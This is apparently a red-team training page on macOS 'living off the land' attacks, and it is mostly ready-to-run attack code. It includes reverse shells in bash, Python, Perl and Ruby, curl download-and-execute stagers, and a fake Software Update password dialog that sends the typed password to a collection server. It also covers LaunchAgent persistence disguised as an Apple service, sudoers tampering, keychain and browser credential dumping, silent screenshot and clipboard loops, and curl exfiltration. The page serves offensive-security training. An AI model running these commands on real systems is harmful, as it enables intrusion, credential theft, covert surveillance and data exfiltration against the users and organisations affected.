---
layout: training-page
title: "macOS Living Off the Land — Red Team Academy"
module: "Living Off the Land"
tags:
  - macos
  - lotl
  - living-off-the-land
  - osascript
  - launchagent
  - tcc
  - t1059.002
  - t1543.001
page_key: "lotl-macos"
render_with_liquid: false
---

# macOS Living Off the Land

Living Off the Land (LOTL) on macOS means achieving red team objectives — execution, persistence, credential access, exfiltration, and evasion — using only binaries, frameworks, and scripting runtimes that ship with the operating system. No tool dropping. No custom executables. No EDR detections on unknown hashes.

macOS ships Python 3 (via Xcode Command Line Tools), Perl, Ruby, curl, osascript, security, launchctl, screencapture, and a dozen other powerful primitives. Every one of them is signed by Apple. Every one of them is trusted by default.

This page focuses on **macOS Ventura (13.x) and Sonoma (14.x)**. Do not duplicate work from the [macOS Red Teaming](../post-exploitation/macos-red-team.md) page — this page is strictly about LOTL technique depth.

---

## 1. macOS Security Model — Operator Constraints

Before running a single command, map what controls are active on the target. Each mechanism blocks a different class of action.

### System Integrity Protection (SIP)

SIP (`csrutil`) runs below the OS and cannot be bypassed from userland without a vulnerability.

```bash
# === SIP STATUS CHECK ===
csrutil status
# "System Integrity Protection status: enabled."

# SIP protects these paths — writes will fail silently or with EPERM:
# /System
# /usr  (except /usr/local — writable)
# /bin
# /sbin
# /private/var/db/  (partially)

# SIP does NOT protect:
# /Library         (writable by root — persistence goldmine)
# /usr/local       (writable by admin users on default macOS install)
# ~/Library        (fully user-writable — LaunchAgents live here)
# /tmp and /var/folders  (temp space — staging area)
# /Applications    (writable by admin — app replacement attacks)

# Check rootless flags on a specific path
ls -lO /System/Library/CoreServices/
# Flags like 'restricted' indicate SIP protection
```

**Operator note:** SIP-protected paths block `root` too. If your persistence or file drop target is under `/System` or `/bin`, you need a SIP bypass or a different path. Use `/Library/LaunchDaemons` or `~/Library/LaunchAgents` instead.

### TCC (Transparency, Consent, Control)

TCC is the per-app permission database. It governs access to sensitive resources regardless of privilege level — `root` cannot read camera frames without TCC.

```bash
# === TCC DATABASE LOCATIONS ===
# User-level TCC (readable by the user):
~/Library/Application\ Support/com.apple.TCC/TCC.db

# System-level TCC (requires root or FDA):
/Library/Application\ Support/com.apple.TCC/TCC.db

# Services controlled by TCC (Ventura/Sonoma):
# kTCCServiceSystemPolicyAllFiles     — Full Disk Access (FDA)
# kTCCServiceAccessibility            — Accessibility / UI automation
# kTCCServiceScreenCapture            — Screen Recording
# kTCCServiceCamera                   — Camera
# kTCCServiceMicrophone               — Microphone
# kTCCServiceAddressBook              — Contacts
# kTCCServiceCalendar                 — Calendar
# kTCCServicePhotos                   — Photos library
# kTCCServiceLocation                 — Location Services

# Read current TCC grants for your process's bundle ID
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value FROM access WHERE auth_value = 2"
# auth_value 2 = allowed, 0 = denied, 1 = not determined

# Check if Terminal has Full Disk Access (key LOTL primitive)
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value FROM access WHERE client LIKE '%Terminal%'"
```

**Operator note:** Child processes inherit TCC context from the parent. If Terminal.app has Full Disk Access, every script you run from Terminal inherits FDA. This is the #1 TCC LOTL primitive.

### Gatekeeper and Quarantine

Gatekeeper checks the `com.apple.quarantine` extended attribute on first launch. It does not apply to scripts run directly from the shell.

```bash
# === GATEKEEPER / QUARANTINE ===
# Check if a file has the quarantine attribute
xattr -l ~/Downloads/suspect.app
# com.apple.quarantine: 0083;60b15a6b;Safari;1A2B3C4D...

# Remove quarantine (attacker-side — if you control the delivery mechanism)
xattr -d com.apple.quarantine ~/Downloads/suspect.app

# Files created via curl, bash, or Terminal do NOT receive quarantine
# This is why LOTL download-and-execute bypasses Gatekeeper natively
curl -sO http://attacker/payload.sh    # no quarantine xattr applied
bash payload.sh                        # Gatekeeper not invoked

# Verify no quarantine on a downloaded file
xattr -l /tmp/payload.sh              # should show nothing
```

### AMFI (Apple Mobile File Integrity)

AMFI enforces code signing at runtime. It validates every Mach-O binary against its embedded signature and Apple's trust chain.

```bash
# === AMFI / CODE SIGNING ===
# Check signature of a binary
codesign -dv --verbose=4 /usr/bin/osascript

# Check AMFI-relevant entitlements on a binary
codesign -d --entitlements :- /usr/bin/curl 2>/dev/null

# LOTL implication: all built-in binaries are Apple-signed
# Their hashes are trusted — no AMFI block
# Interpreted languages (Python, Perl, Ruby) run under the interpreter's signature
# Your malicious Python script runs under Apple-signed python3 — AMFI passes
```

---

## 2. osascript / AppleScript — Execution and UI Interaction

`osascript` is macOS's most powerful LOTL binary. It provides shell execution, GUI automation, credential harvesting, and application control — all via an Apple-signed binary. **MITRE ATT&CK: T1059.002**

### Shell Execution via osascript

```applescript
# === BASIC SHELL EXECUTION ===
# Execute a shell command and return stdout
osascript -e 'do shell script "id"'
# Returns: uid=501(operator) gid=20(staff)...

# Background execution (fire-and-forget)
osascript -e 'do shell script "nohup bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &"'

# Execute via JXA (JavaScript for Automation) — same binary, different engine
osascript -l JavaScript -e 'ObjC.import("stdlib"); $.system("id")'

# Multi-line AppleScript from stdin (avoids command line history)
osascript << 'EOF'
do shell script "whoami && hostname && date"
EOF
```

### Privilege Escalation via Admin Dialog

```applescript
# === PRIVILEGE ESCALATION WITH AUTH DIALOG ===
# macOS will show a legitimate-looking admin password prompt
# T1548.004 — Elevated Execution with Prompt

osascript -e 'do shell script "id" with administrator privileges'
# Pops native macOS password dialog — result runs as root

# Realistic escalation: write LaunchDaemon as root
osascript -e 'do shell script "cp /tmp/com.apple.updates.plist /Library/LaunchDaemons/ && launchctl load /Library/LaunchDaemons/com.apple.updates.plist" with administrator privileges'

# Escalate and add user to sudoers
osascript -e 'do shell script "echo \"operator ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers" with administrator privileges'

# Sonoma note: repeated prompts may trigger UserNotifications — space them out
```

### UI Interaction — Keystroke Injection

```applescript
# === UI AUTOMATION FOR PHISHING SIMULATION ===
# T1056.002 — GUI Input Capture

# Send keystrokes to frontmost application
osascript -e '
tell application "System Events"
  keystroke "malicious text"
  key code 36  -- Return key
end tell
'

# Click a specific UI element by name
osascript -e '
tell application "System Events"
  tell process "Finder"
    click button "OK" of window 1
  end tell
end tell
'

# Requires: Terminal must have Accessibility TCC permission
# Check: System Settings > Privacy & Security > Accessibility
```

### Credential Harvesting via Spoofed Dialog

```applescript
# === SPOOFED CREDENTIAL DIALOG ===
# T1056.002 — GUI Input Capture via Social Engineering
# Displays a dialog indistinguishable from a real macOS prompt

osascript << 'EOF'
set dialog_result to display dialog "macOS needs your password to install a security update." \
  with title "Software Update" \
  default answer "" \
  with hidden answer \
  with icon caution \
  buttons {"Cancel", "OK"} \
  default button "OK"

set harvested_password to text returned of dialog_result

-- Exfiltrate via shell (replace with your C2 URL)
do shell script "curl -sk -X POST https://10.10.14.1/collect -d 'p=" & harvested_password & "'"
EOF
```

> **Scenario:** Operator has shell on a macOS workstation. The current user is a local admin but not root. Run the spoofed dialog above — when the user authenticates (believing it's a legitimate prompt), capture the plaintext password and escalate with `do shell script "..." with administrator privileges` using the stolen credential. No tools dropped. Detection: unusual `osascript` process with network connection. T1059.002 + T1056.002.

### Clipboard Operations

```bash
# === CLIPBOARD — T1115 ===
# Read current clipboard
pbpaste

# Monitor clipboard in a loop (silent — no TCC required for user-owned clipboard)
while true; do pbpaste >> /tmp/.clip.log; sleep 5; done &

# Write to clipboard (useful for UI injection attacks)
echo "malicious content" | pbcopy

# Exfiltrate clipboard contents
pbpaste | base64 | curl -sk -X POST https://10.10.14.1/clip --data-binary @-
```

---

## 3. curl / Python / Perl / Ruby — Download and Execution

macOS ships all four runtimes. They are Apple-signed (or CLT-signed), bypassing hash-based detections. **MITRE ATT&CK: T1059.006 (Python), T1059.003 (shell), T1105 (download)**

### curl — Fileless Download and Execute

```bash
# === CURL STAGING — T1105 + T1059.003 ===
# Download and execute without writing to disk (process substitution)
bash <(curl -sk https://10.10.14.1/stage.sh)

# Pipe directly to bash (classic — logged in shell history)
curl -sk https://10.10.14.1/stage.sh | bash

# Avoid bash history: use /dev/stdin trick
curl -sk https://10.10.14.1/stage.sh > /dev/stdin

# Verify TLS cert of attacker server is trusted (or skip with -k)
# -k disables cert validation — acceptable for internal ops
# -s suppresses progress output — required for silent ops

# Download binary payload to /tmp (writable, not SIP-protected)
curl -sk https://10.10.14.1/agent -o /tmp/.updateservice
chmod +x /tmp/.updateservice
/tmp/.updateservice &

# Sonoma note: curl is at /usr/bin/curl — SIP-protected binary, trusted
```

### Python 3 — Reverse Shell and Execution

```bash
# === PYTHON3 REVERSE SHELL — T1059.006 ===
# python3 available via Xcode CLT: xcode-select --install
# Ventura: python3 at /usr/bin/python3 (shim) or /Library/Developer/CommandLineTools/usr/bin/python3
# Sonoma 14.x: same — python3 shim present, CLT required for full python3

# Check availability
which python3 && python3 --version

# One-liner reverse shell
python3 -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('10.10.14.1',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"

# Download and exec in-memory (no disk write)
python3 -c "import urllib.request,subprocess; exec(urllib.request.urlopen('https://10.10.14.1/payload.py').read())"

# Python HTTP server for quick staging (serves current directory)
python3 -m http.server 8080 &
# Attacker pulls files: curl http://target:8080/sensitive.tar.gz
```

### Perl — Reverse Shell

```bash
# === PERL REVERSE SHELL — T1059.005 ===
# Perl ships with macOS Ventura at /usr/bin/perl
# Sonoma: perl still present but marked for future removal — verify first
perl --version

# Classic perl reverse shell
perl -e 'use Socket; $i="10.10.14.1"; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");}'

# Perl one-liner: execute command and return output
perl -e 'print `id`'

# Download and execute Perl script in-memory
perl <(curl -sk https://10.10.14.1/payload.pl)
```

### Ruby — Reverse Shell

```bash
# === RUBY REVERSE SHELL ===
# Ruby available via Xcode CLT — /usr/bin/ruby (system ruby, older version)
# Full ruby via CLT: /Library/Developer/CommandLineTools/usr/bin/ruby
ruby --version

# Ruby reverse shell one-liner
ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.10.14.1","4444"); while(cmd=c.gets); IO.popen(cmd,"r"){|io| c.print io.read} end'

# Ruby exec
ruby -e 'puts `id`'
```

### launchctl and plutil — Native Plist Management

```bash
# === PLIST MANIPULATION — no tool dropping ===
# plutil ships at /usr/bin/plutil — Apple-signed, SIP-protected binary

# Convert plist from binary to XML for reading
plutil -convert xml1 /Library/Preferences/com.apple.TimeMachine.plist -o /tmp/tm.xml
cat /tmp/tm.xml

# Read a plist value directly
plutil -extract ComputerName raw /Library/Preferences/SystemConfiguration/preferences.plist

# Validate a plist before loading
plutil -lint ~/Library/LaunchAgents/com.apple.updates.plist

# launchctl: query loaded agents
launchctl list | grep -v apple
launchctl print system/ | head -50
```

> **Scenario:** Target machine has curl and python3 (CLT installed — common on developer workstations). Stage a Python reverse shell using `bash <(curl -sk https://attacker/r.sh)` from an osascript-delivered Terminal command. Nothing written to disk. The only network IOC is an outbound curl to your server over HTTPS. T1105 + T1059.006.

---

## 4. Persistence via LaunchAgents and LaunchDaemons

Native macOS persistence — no third-party tools, no kernel extensions. **MITRE ATT&CK: T1543.001 (LaunchAgent), T1543.004 (LaunchDaemon)**

### LaunchAgent vs LaunchDaemon

```bash
# === LAUNCH MECHANISM COMPARISON ===

# LaunchAgent — runs as the logged-in user
# Loaded per-user at login
# Locations:
#   ~/Library/LaunchAgents/          (user-writable — no root needed)
#   /Library/LaunchAgents/           (root-writable — persists for all users)
#   /System/Library/LaunchAgents/    (SIP-protected — avoid)

# LaunchDaemon — runs as root, starts at boot, no user session required
# Locations:
#   /Library/LaunchDaemons/          (root-writable — ideal for root persistence)
#   /System/Library/LaunchDaemons/   (SIP-protected — avoid)

# Check existing user LaunchAgents (great recon step)
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/
launchctl list | grep -v "^-"
```

### Writing a LaunchAgent via Bash Heredoc

```bash
# === LAUNCHAGENT PERSISTENCE — T1543.001 ===
# No tool dropping — pure bash heredoc, plutil, launchctl

# Step 1: Write the plist using a heredoc (no file editor needed)
cat > ~/Library/LaunchAgents/com.apple.updates.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.apple.updates</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>bash -i &gt;&amp; /dev/tcp/10.10.14.1/4444 0&gt;&amp;1</string>
  </array>
  <key>StartInterval</key>
  <integer>300</integer>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <false/>
</dict>
</plist>
PLIST

# Step 2: Validate the plist
plutil -lint ~/Library/LaunchAgents/com.apple.updates.plist

# Step 3: Load immediately (no reboot needed)
launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist

# Verify it's loaded
launchctl list | grep com.apple.updates
```

### StartInterval vs StartCalendarInterval vs WatchPaths

```bash
# === TRIGGER VARIATIONS ===

# StartInterval: run every N seconds (simplest — use for beaconing)
# <key>StartInterval</key><integer>300</integer>  ← every 5 minutes

# StartCalendarInterval: cron-like scheduling
# Run at 9:00 AM every weekday:
cat >> /tmp/calendar_trigger.xml << 'EOF'
<key>StartCalendarInterval</key>
<dict>
  <key>Hour</key><integer>9</integer>
  <key>Minute</key><integer>0</integer>
  <key>Weekday</key><integer>1</integer>
</dict>
EOF

# WatchPaths: trigger when file/directory changes (event-driven — stealthy)
# Great for: "run my stager whenever the user opens ~/Downloads"
cat >> /tmp/watchpath_trigger.xml << 'EOF'
<key>WatchPaths</key>
<array>
  <string>/Users/target/Downloads</string>
</array>
EOF

# LaunchDaemon persistence (requires root — use osascript admin escalation)
osascript -e 'do shell script "cp /tmp/com.apple.sysd.plist /Library/LaunchDaemons/ && launchctl load -w /Library/LaunchDaemons/com.apple.sysd.plist" with administrator privileges'
```

### LoginItems via AppleScript

```applescript
# === LOGIN ITEMS — T1547.009 ===
# Adds an item to the user's Login Items (visible in System Settings)
# Less stealthy than LaunchAgents but simpler for PoC

osascript -e '
tell application "System Events"
  make login item at end with properties {path:"/Library/Application Support/agent/updater", hidden:true}
end tell
'

# List current login items
osascript -e '
tell application "System Events"
  get the name of every login item
end tell
'
```

> **Scenario:** Operator has user-level shell (no root). Write a LaunchAgent plist via heredoc targeting `com.apple.updates` (mimics Apple naming). Set `StartInterval` to 300 seconds. Load with `launchctl`. The agent beacons every 5 minutes via a `bash -i` reverse shell to your listener. Total tool drop: zero. Detection: `launchctl list` shows non-Apple Label; `~/Library/LaunchAgents/` listing; outbound TCP every 5 min. T1543.001.

---

## 5. Keychain Credential Extraction

The macOS Keychain is the single richest credential store on the platform. The `security` CLI is Apple-signed and ships at `/usr/bin/security`. **MITRE ATT&CK: T1555.001**

### Keychain Enumeration

```bash
# === KEYCHAIN ENUMERATION ===
# Keychain locations:
#   User login keychain: ~/Library/Keychains/login.keychain-db
#   System keychain:     /Library/Keychains/System.keychain
#   iCloud keychain:     ~/Library/Keychains/<UUID>/keychain-2.db (iCloud-synced)

# List all keychains in the search list
security list-keychains

# List all keychain items (metadata only — no secrets)
security dump-keychain ~/Library/Keychains/login.keychain-db

# Dump keychain WITH secrets (prompts user per-item unless keychain is unlocked)
security dump-keychain -d ~/Library/Keychains/login.keychain-db
# When the keychain is unlocked (active user session), many items dump without prompting
```

### Targeted Credential Extraction

```bash
# === TARGETED KEYCHAIN QUERIES — T1555.001 ===

# Extract WiFi passwords (works if Terminal has FDA or user is in admin group)
security find-generic-password -s "WIFI_SSID_NAME" -w
# -w flag: print password to stdout without UI prompt (if keychain unlocked)

# Extract by label (scan for common labels first)
security dump-keychain | grep "svce\|acct\|labl" | head -50

# Find internet password for a specific domain
security find-internet-password -s "github.com" -w
security find-internet-password -s "corp-vpn.company.com" -w

# Extract certificate from keychain
security find-certificate -a -e "admin@company.com" -p > /tmp/cert.pem

# Export all certificates to PEM
security find-certificate -a -p ~/Library/Keychains/login.keychain-db > /tmp/all_certs.pem

# Find all internet passwords (metadata dump — no -w flag to avoid per-item prompts)
security dump-keychain | grep -A 4 "inet"

# Extract AWS credentials stored in keychain (common on developer machines)
security find-generic-password -s "aws" -a "aws_access_key_id" -w 2>/dev/null
security find-generic-password -s "aws" -a "aws_secret_access_key" -w 2>/dev/null
```

### Browser Credential Extraction

```bash
# === BROWSER CREDENTIALS — T1555.003 ===

# Chrome Login Data (SQLite — requires FDA or SIP bypass on Sonoma)
# With Full Disk Access inherited from Terminal:
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/chrome_logins.db
sqlite3 /tmp/chrome_logins.db "SELECT origin_url, username_value, password_value FROM logins"
# Passwords are AES-encrypted with a key stored in the keychain:
security find-generic-password -s "Chrome Safe Storage" -w

# Firefox credentials (JSON — accessible with user perms)
find ~/Library/Application\ Support/Firefox/Profiles -name "logins.json" | \
  xargs -I{} cp {} /tmp/firefox_logins.json
cat /tmp/firefox_logins.json

# Safari — integrated with system keychain
# Passwords stored in ~/Library/Keychains/ — dump via security CLI above

# Edge (Chromium-based) — same path pattern as Chrome
find ~/Library/Application\ Support/Microsoft\ Edge -name "Login Data" 2>/dev/null | \
  xargs -I{} cp {} /tmp/edge_logins.db
```

### System Keychain — WiFi Passwords

```bash
# === WIFI PASSWORD EXTRACTION ===
# System keychain stores WiFi PSKs — requires root or admin privileges

# List all WiFi networks the machine has connected to
networksetup -listpreferredwirelessnetworks en0

# Extract password for a specific SSID (prompts root auth or uses admin session)
security find-generic-password -s "TARGET_SSID" -D "AirPort network password" -w

# Bulk extract all WiFi passwords
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | \
  awk 'NR>1 {print $1}' | while read ssid; do
    echo -n "$ssid: "
    security find-generic-password -s "$ssid" -D "AirPort network password" -w 2>/dev/null || echo "(no password)"
  done
```

> **Scenario:** Operator has user-level shell on a developer MacBook. Terminal.app has Full Disk Access (common — developers grant this for tools like iTerm2/Terminal). Run `security dump-keychain -d` — the login keychain is unlocked in the active session. Extract GitHub, AWS, and corporate VPN credentials without any additional prompts. Exfil via curl POST. T1555.001.

---

## 6. TCC Bypass Patterns

TCC is the last line of defense for sensitive resources. LOTL TCC bypasses work by abusing apps that already have permissions. **MITRE ATT&CK: T1548, T1083**

### Inheriting FDA from a Parent Process

```bash
# === TCC INHERITANCE — LOTL'S MOST POWERFUL PRIMITIVE ===
# Child processes inherit TCC entitlements from their parent

# Step 1: Identify apps on the system with Full Disk Access
# (Read system TCC.db if you have root, or check common known FDA holders)
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2"
# Requires root. If not root, enumerate common FDA holders:

# Common apps that users grant FDA to:
# - /Applications/iTerm.app          (developer default)
# - /Applications/Visual Studio Code.app
# - /usr/bin/bash (if granted by user)
# - Backup agents (BackBlaze, CCC, Time Machine helper)
# - Terminal.app

# Step 2: If you have execution under a process with FDA, you inherit it
# Spawn a child shell from the FDA-holding parent
open -a Terminal           # if Terminal has FDA, your shell inside inherits it

# Read a TCC-protected path (e.g., ~/Library/Messages)
ls ~/Library/Messages/     # succeeds if parent has FDA
cat ~/Library/Messages/chat.db
```

### Abusing Accessibility TCC

```applescript
# === ACCESSIBILITY ABUSE — T1548 ===
# If Terminal (or any parent) has Accessibility TCC:
# osascript can interact with ANY running application's UI

# Read text from any application window
osascript -e '
tell application "System Events"
  tell process "1Password 7"
    get value of text field 1 of window 1
  end tell
end tell
'

# Automate a privileged app to perform actions on our behalf
# Example: use Finder (which has broader file access) to copy a protected file
osascript -e '
tell application "Finder"
  duplicate file POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" \
    to folder POSIX file "/tmp/" with replacing
end tell
'
```

### TCC Database Direct Read

```bash
# === TCC.db DIRECT READ ===
# Requires root OR the process must have FDA

# Read system TCC grants (all users, all services)
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value, last_modified FROM access ORDER BY last_modified DESC"

# Read user TCC grants (user-level, no FDA required)
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value FROM access"

# Ventura/Sonoma: TCC.db is locked while in use — copy first
cp ~/Library/Application\ Support/com.apple.TCC/TCC.db /tmp/tcc_copy.db
sqlite3 /tmp/tcc_copy.db "SELECT * FROM access"
```

### Symlink Attacks into Protected Directories

```bash
# === SYMLINK BYPASS PATTERN ===
# Some protected paths are symlink-traversable if the symlink source is writable

# Example: if an app writes to ~/Library/Caches/ without resolving symlinks,
# and that app has FDA, point its cache dir to a sensitive location
# (app writes its cache data → effectively reads and writes protected files)

# Pattern: create symlink from writable path to sensitive path
mkdir -p /tmp/exploit_dir
ln -s ~/Library/Messages /tmp/exploit_dir/messages_symlink
# If a backup agent with FDA reads /tmp/exploit_dir/, it will follow the symlink
# into ~/Library/Messages/ and expose contents
```

> **Scenario:** Target corporate MacBook has a backup agent (BackBlaze) with FDA. The agent runs as a LaunchDaemon, and its helper binary is writable by root but the agent itself has FDA via TCC. Using `osascript` with admin escalation, spawn a shell under the backup agent's process context — all file operations in that shell inherit FDA. Now `cat ~/Library/Messages/chat.db` and `ls ~/Library/Mail/` succeed without any TCC prompt. T1548 + T1083.

---

## 7. Built-in Enumeration — Recon LOL Binaries

Full system recon using only Apple-signed binaries. **MITRE ATT&CK: T1082, T1016, T1033, T1087, T1083**

### Hardware and System Information

```bash
# === SYSTEM PROFILER — T1082 ===
# system_profiler: full hardware/software inventory — Apple-signed, always present

# Hardware overview (model, serial, CPU, RAM)
system_profiler SPHardwareDataType
# Key fields: Machine Name, Machine Model, Serial Number, Hardware UUID

# OS version and build
system_profiler SPSoftwareDataType

# Installed applications (targets for DLL/dylib hijacking)
system_profiler SPApplicationsDataType | grep -E "Location:|Version:"

# Network interfaces and configuration
system_profiler SPNetworkDataType

# Installed certificates (identify corporate CAs)
system_profiler SPCertificatesDataType

# Connected USB devices (for hardware implant recon)
system_profiler SPUSBDataType

# One-liner: collect full profile to file for exfil
system_profiler SPHardwareDataType SPSoftwareDataType SPNetworkDataType \
  SPApplicationsDataType > /tmp/.sysinfo.txt
```

### Network Enumeration

```bash
# === NETWORK RECON — T1016 ===

# List all network services and their status
networksetup -listallnetworkservices

# Get IP/subnet/gateway for each interface
networksetup -getinfo "Wi-Fi"
networksetup -getinfo "Ethernet"

# DNS servers
networksetup -getdnsservers "Wi-Fi"
scutil --dns | grep nameserver | head -10

# ARP table (lateral movement targeting)
arp -a

# Active connections
netstat -an | grep ESTABLISHED

# Listening ports (services running — pivot targets)
netstat -an | grep LISTEN

# Route table
netstat -rn

# VPN configurations (built-in VPN service names)
scutil --nc list

# mDNS / Bonjour discovery (zero-config neighbors)
dns-sd -B _ssh._tcp local &
sleep 5; kill %1
```

### User and Directory Enumeration

```bash
# === USER ENUMERATION — T1087 ===

# List all local users via Directory Services CLI
dscl . -list /Users | grep -v "^_"

# Get details on a specific user
dscl . -read /Users/targetuser

# List groups a user belongs to
id targetuser
dscl . -list /Groups | while read g; do
  dscl . -read /Groups/$g GroupMembership 2>/dev/null | grep targetuser && echo "  ↳ $g"
done

# List admin users
dscl . -read /Groups/admin GroupMembership

# Check for SSH authorized keys (pivot indicator)
find /Users -name "authorized_keys" 2>/dev/null
find /Users -name "*.pub" 2>/dev/null

# Environment variables (credentials often stored here)
env | sort
```

### Hardware Details and Serial Numbers

```bash
# === IOREG — T1082 ===
# ioreg traverses the I/O Registry — hardware tree

# Get system serial number
ioreg -l | grep IOPlatformSerialNumber
# Or:
system_profiler SPHardwareDataType | grep "Serial Number"

# Get hardware UUID
ioreg -rd1 -c IOPlatformExpertDevice | grep -E "UUID|Serial"

# Battery info (laptops — assess if plugged in / power state)
ioreg -l | grep -i battery | grep Capacity

# Bluetooth devices (nearby devices — physical recon)
ioreg -l | grep -i bluetooth | grep "Device Name"
```

### Preference Files and Configuration Mining

```bash
# === DEFAULTS / PLIST MINING — T1083 ===
# 'defaults' reads macOS preference files — can reveal sensitive configs

# Read global preferences
defaults read NSGlobalDomain | head -50

# Read app-specific preferences
defaults read com.apple.screensaver  # screen saver / lock policy
defaults read com.apple.loginwindow  # login window config

# Find all preference files (goldmine for credentials in configs)
find ~/Library/Preferences -name "*.plist" | head -30

# Parse a specific plist with plutil
plutil -p ~/Library/Preferences/com.apple.dock.plist

# Mine for credentials / tokens in plist files
grep -r "password\|token\|secret\|api_key" ~/Library/Preferences/ 2>/dev/null

# Check application support for config files with credentials
grep -r "password\|token\|secret" ~/Library/Application\ Support/ \
  --include="*.json" --include="*.yaml" --include="*.toml" -l 2>/dev/null
```

### Spotlight — Fast File Discovery

```bash
# === MDFIND / MDLS — T1083 ===
# mdfind queries the Spotlight metadata index — zero scanning, instant results

# Find all PDF documents on the machine
mdfind 'kMDItemKind == "PDF Document"'

# Find documents containing the word "password"
mdfind "password" -onlyin ~/Documents

# Find SSH keys
mdfind -name "id_rsa"
mdfind -name "*.pem"

# Find recently modified documents (last 7 days)
mdfind 'kMDItemFSContentChangeDate > $time.now(-604800)'

# Find all Office documents
mdfind 'kMDItemKind == "Microsoft Word Document" || kMDItemKind == "Microsoft Excel Spreadsheet"'

# Get metadata on a file
mdls ~/Desktop/report.pdf
mdls -name kMDItemWhereFroms ~/Downloads/installer.dmg  # shows download URL

# Find files by creator app (documents created in specific apps)
mdfind 'kMDItemCreator == "Microsoft Excel"'
```

> **Scenario:** Operator has user-shell on an executive's MacBook. Run `mdfind kMDItemKind == "PDF Document"` — returns 847 PDFs across the machine, including under Time Machine backups. Run `mdfind "Q1 board" -onlyin ~/` to find board materials. Run `system_profiler SPApplicationsDataType` to identify installed apps and version numbers for known-vuln research. All via Apple-signed binaries. T1083 + T1082.

---

## 8. Screencapture / Audio / Camera — Data Collection

macOS ships `screencapture`, `afplay`, and `say` as standard binaries. Collection requires specific TCC permissions held by the calling process. **MITRE ATT&CK: T1113 (Screen Capture), T1123 (Audio Capture)**

### Silent Screenshot

```bash
# === SCREENCAPTURE — T1113 ===
# Requires: Screen Recording TCC permission for the calling process
# If Terminal has Screen Recording, all scripts inherit it

# Silent screenshot to file (-x suppresses camera click sound)
screencapture -x /tmp/.screen_$(date +%s).png

# Screenshot to clipboard (no file written)
screencapture -c

# Screenshot of a specific window (by window ID)
# First get window IDs:
osascript -e 'tell app "System Events" to get every window of every process'

# Screenshot with delay (user won't see flash — appears less suspicious)
screencapture -T 3 -x /tmp/.sc.png

# Capture specific screen in multi-monitor setup (-D screen number)
screencapture -D 1 -x /tmp/.screen1.png

# Continuous screenshot loop (2-second interval) — background collection
while true; do
  screencapture -x /tmp/.sc_$(date +%s).png
  sleep 2
done &
SCREEN_PID=$!

# Exfil all screenshots
find /tmp -name ".sc_*.png" | while read f; do
  curl -sk -X POST https://10.10.14.1/screen --data-binary @"$f" && rm "$f"
done
```

### Audio Collection via Built-in Tools

```bash
# === AUDIO — T1123 ===
# afrecord not available natively — use python or osascript for mic
# say: Apple TTS — useful for testing audio path or spoofing alerts

# Text-to-speech (social engineering / testing)
say "Security scan complete. Your system is protected."

# Play a sound file (cover noise during operations)
afplay /System/Library/Sounds/Glass.aiff

# Mic recording via python3 (if available) — no GUI required
python3 << 'EOF'
import subprocess
# Use system sox if installed, else fall back to osascript QuickTime automation
subprocess.run(['osascript', '-e',
  'tell app "QuickTime Player" to start (new audio recording)'])
EOF
```

### QuickTime Automation via osascript

```applescript
# === QUICKTIME SCREEN/AUDIO RECORDING ===
# QuickTime Player is Apple-signed and may already have Screen Recording TCC

osascript << 'EOF'
tell application "QuickTime Player"
  set newRecording to new screen recording
  start newRecording
  delay 30  -- record for 30 seconds
  stop newRecording
  save newRecording in POSIX file "/tmp/.recording.mov"
  close newRecording saving no
end tell
EOF

# Requires QuickTime to have Screen Recording TCC
# May prompt user on first use — subsequent runs are silent
```

### Clipboard Monitoring

```bash
# === CLIPBOARD — T1115 ===
# No TCC required for user's own pasteboard

# One-time capture
pbpaste | tee /tmp/.clip_$(date +%s).txt

# Monitor clipboard for changes (detect password manager pastes)
prev=""
while true; do
  current=$(pbpaste 2>/dev/null)
  if [ "$current" != "$prev" ]; then
    echo "$current" >> /tmp/.clipboard_log.txt
    prev="$current"
  fi
  sleep 1
done &
```

> **Scenario:** Terminal has Screen Recording TCC (granted by developer for screen sharing tools). Deploy `screencapture -x` in a loop with 10-second interval. Compress screenshots with `gzip` and POST to C2 via `curl`. Loop runs in background. Operator sees live desktop view of target. No executable dropped — only Apple's `screencapture` and `curl`. T1113.

---

## 9. Exfiltration via Built-in Tools

Getting data off the target using only macOS-native tools. **MITRE ATT&CK: T1041 (C2 Channel), T1048.003 (DNS Exfil), T1030 (Data Transfer Size Limits)**

### curl POST Exfiltration

```bash
# === CURL EXFIL — T1041 ===

# Exfiltrate a single file via HTTPS POST
curl -sk -X POST https://10.10.14.1/upload \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/keychain_dump.txt

# Exfiltrate with authentication header (blend with legitimate API traffic)
curl -sk -X POST https://10.10.14.1/api/v1/data \
  -H "Authorization: Bearer LEGITIMATE_LOOKING_TOKEN" \
  --data-binary @/tmp/data.tar.gz

